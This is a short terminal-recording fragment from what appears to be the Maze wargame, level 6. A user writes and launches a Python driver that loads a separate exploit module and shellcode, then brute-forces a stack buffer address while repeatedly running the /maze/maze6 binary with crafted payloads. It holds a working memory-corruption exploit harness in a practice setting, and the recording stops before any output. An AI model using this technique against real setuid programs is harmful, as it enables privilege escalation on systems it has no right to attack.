[66.48562, "o", "cat > /run/screen/l6/fire.py <<'PYEOF'\r\r\n\u001b[?2004l\r\u001b[?2004h> import subprocess, importlib.util\r\r\n\u001b[?2004l\r\u001b[?2004h> spec = importlib.util.spec_from_file_location(\"exploit\", \"/run/screen/l6/exploit.py\")\r\r\n\u001b[?2004l\r\u001b[?2004h> ex = importlib.util.module_from_spec(spec)\r\r\n\u001b[?2004l\r\u001b[?2004h> spec.loader.exec_module(ex)\r\r\n\u001b[?2004l\r\u001b[?2004h> sc = open(\"/run/screen/l6/sc.bin\", \"rb\").read()\r\r\n\u001b[?2004l\r\u001b[?2004h> path = b\"/run/screen/l6/wP.txt\"\r\r\n\u001b[?2004l\r\u001b[?2004h> for delta in range(-0x1000, 0x1001, 4):\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf = 0xffffd824 + delta\r\r\n\u001b[?2004l\r\u001b[?2004h>     try:\r\r\n\u001b[?2004l\r\u001b[?2004h>         pay = ex.build(buf, path, sc)\r\r\n\u001b[?2004l\r\u001b[?2004h>     except AssertionError:\r\r\n\u001b[?2004l\r\u001b[?2004h>         continue\r\r\n\u001b[?2004l\r\u001b[?2004h>     try:\r\r\n\u001b[?2004l\r\u001b[?2004h>         r = subprocess.run([\"/maze/maze6\", path, pay], capture_output=True, timeout=5)\r\r\n\u001b[?2004l\r\u001b[?2004h>     except subprocess.TimeoutExpired:\r\r\n\u001b[?2004l\r\u001b[?2004h>         continue\r\r\n\u001b[?2004l\r\u001b[?2004h>     if r.returncode == 0 and r.stdout:\r\r\n\u001b[?2004l\r\u001b[?2004h>         print(\"HIT buf\", hex(buf))\r\r\n\u001b[?2004l\r\u001b[?2004h>         print(r.stdout.decode(\"latin-1\"))\r\r\n\u001b[?2004l\r\u001b[?2004h>         break\r\r\n\u001b[?2004l\r\u001b[?2004h> else:\r\r\n\u001b[?2004l\r\u001b[?2004h>     print(\"none\")\r\r\n\u001b[?2004l\r\u001b[?2004h> PYEOF\r\r\n\u001b[?2004l\r\u001b]3008;start=d431f897-b1b9-4b85-bf3d-e77a41f2fcff;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l6\u001b\\\u001b]3008;end=d431f897-b1b9-4b85-bf3d-e77a41f2fcff;exit=success\u001b\\\u001b]3008;start=3a687c62-dfce-4130-80b1-eac70b32b1b8;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l6\u001b\\\u001b[?2004h\u001b]0;maze6@maze: /run/screen/l6\u0007maze6@maze:/run/screen/l6$ "]
[66.678212, "o", "timeout 400 python3 fire.py\r\r\n\u001b[?2004l\r\u001b]3008;start=39a4bdb8-c1dc-43bd-95d3-e46174689b23;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/run/screen/l6\u001b\\"]
